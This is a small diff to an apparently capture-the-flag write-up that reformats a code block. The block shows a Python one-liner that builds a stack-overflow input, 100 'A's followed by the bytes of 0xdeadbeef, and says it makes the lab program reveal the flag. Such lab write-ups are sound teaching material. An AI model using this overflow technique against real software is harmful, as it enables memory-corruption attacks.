@@ -70,9 +70,10 @@ The stack has the variable `password` with length 8 bytes on top of it (remember
 
 
 To craft our malformed input, we use python as follows:
-`print('A'*100+'\xef\xbe\xad\xde')`
-`>>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
-`
+```
+print('A'*100+'\xef\xbe\xad\xde')`
+>>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+```
 >note the special chars at the end representing the hex value `0xdeadbeef`
 
 By entering this value into the program, it gives the FLAG.
